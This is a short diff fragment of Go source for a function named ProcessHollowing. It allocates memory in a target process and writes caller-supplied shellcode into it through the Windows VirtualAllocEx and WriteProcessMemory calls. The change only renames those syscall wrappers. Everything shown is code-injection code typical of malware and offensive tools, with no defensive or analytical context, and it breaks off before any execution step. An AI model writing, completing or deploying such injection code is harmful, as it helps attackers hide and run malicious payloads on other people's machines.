@@ -15,7 +15,7 @@ func ProcessHollowing(targetProcessID uint32, shellcode []byte, entryPoint uintp
 	defer syscall.CloseHandle(processHandle)
 
 	// Allocate memory for the shellcode within the target process.
-	addr, _, err := ProcVirtualAllocEx.Call(
+	addr, _, err := VirtualAllocEx.Call(
 		uintptr(processHandle),
 		0,
 		uintptr(len(shellcode)),
@@ -27,7 +27,7 @@ func ProcessHollowing(targetProcessID uint32, shellcode []byte, entryPoint uintp
 	}
 
 	// Write the shellcode to the allocated memory within the target process.
-	_, _, err = ProcWriteProcessMemory.Call(
+	_, _, err = WriteProcessMemory.Call(
 		uintptr(processHandle),
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
